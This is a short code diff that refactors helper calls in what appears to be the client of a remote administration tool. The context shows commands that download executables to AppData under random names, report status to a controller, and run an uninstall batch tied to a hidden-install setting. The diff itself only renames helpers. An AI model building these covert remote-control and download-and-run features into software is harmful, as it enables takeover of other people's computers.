@@ -6,6 +6,7 @@ using System.Threading;
 using xClient.Config;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
 {
@@ -50,7 +51,7 @@ namespace xClient.Core.Commands
                 }
                 catch (Exception ex)
                 {
-                    DeleteFile(filePath);
+                    NativeMethods.DeleteFile(filePath);
                     new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                 }
 
@@ -62,7 +63,7 @@ namespace xClient.Core.Commands
                 new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);
 
                 string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    Helper.Helper.GetRandomFilename(12, ".exe"));
+                    FileHelper.GetRandomFilename(12, ".exe"));
 
                 try
                 {
@@ -93,7 +94,7 @@ namespace xClient.Core.Commands
             try
             {
                 string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    Helper.Helper.GetRandomFilename(12, ".bat"));
+                    FileHelper.GetRandomFilename(12, ".bat"));
 
                 string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                     ? "@echo off" + "\n" +
